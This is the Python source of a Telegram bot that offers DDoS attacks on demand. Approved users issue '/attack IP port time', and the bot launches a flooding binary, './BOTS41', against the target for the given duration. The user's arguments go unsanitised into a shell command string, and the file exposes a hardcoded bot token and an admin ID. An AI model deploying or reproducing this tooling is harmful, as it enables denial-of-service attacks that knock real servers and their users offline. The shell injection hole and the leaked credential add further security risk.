import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7579868473:AAEd7odvjYgam9QLRymRza46N2Es9vzEFrA'
ADMIN_USER_ID = 1549147628
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩*\n\n"
        "*𝙱𝙶𝙼𝙸 𝙳𝙳𝙾𝚂 𝙸𝚂 𝚁𝚄𝙽𝙽𝙸𝙽𝙶*\n"
        "*𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗬 𝗦𝟰*\n"
        "*𝘜𝘚𝘌 :- /𝘢𝘵𝘵𝘢𝘤𝘬 𝘐𝘗 𝘱𝘰𝘳𝘵 𝘵𝘪𝘮𝘦*\n\n"
        "*𝗢𝗪𝗡𝗘𝗥 :- @Shailesh2346*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘 𝗕𝗬 𝗦𝟰*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ʟɪᴋᴇ :- /ᴍᴀɴᴀɢᴇ ᴀᴅᴅ ᴜꜱᴇʀ_ɪᴅ*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*𝗔𝗗𝗗𝗜𝗡𝗚 {target_user_id} 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*𝗥𝗘𝗠𝗢𝗩𝗘 {target_user_id} 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./BOTS41 {ip} {port} {duration} 600",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ 𝗘𝗥𝗥𝗢𝗥 ⚠️: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*🎗️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 🎗️*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘 𝗕𝗬 𝗦𝟰*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋ ɪꜱ 𝗣𝗔𝗡𝗗𝗜𝗡𝗚 ʙᴇᴄᴏᴜꜱᴇ ᴀᴛᴛᴀᴄᴋ 𝗔𝗟𝗟𝗥𝗘𝗔𝗗𝗬 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 ᴘʟᴢ ᴡᴀɪᴛ ᴀᴛᴛᴀᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ ᴍᴀꜱꜱᴀɢᴇ*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*/𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗*\n"
        f"*𝗧𝗔𝗥𝗚𝗘𝗧 :- {ip}*\n"
        f"*ק๏гՇ :- {port}*\n"
        f"*𝗦𝗘𝗖. :- {duration}*\n"
        f"*𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
